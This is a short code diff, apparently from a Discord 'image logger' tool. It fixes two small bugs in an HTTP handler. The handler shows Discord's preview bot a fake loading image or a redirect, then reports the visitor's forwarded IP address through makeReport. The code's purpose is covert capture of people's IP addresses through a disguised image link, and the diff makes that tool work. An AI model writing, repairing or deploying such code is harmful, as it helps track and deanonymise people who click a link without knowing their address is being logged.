@@ -218,10 +218,10 @@ height: 100vh;
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location' ,'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
-                if self.config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
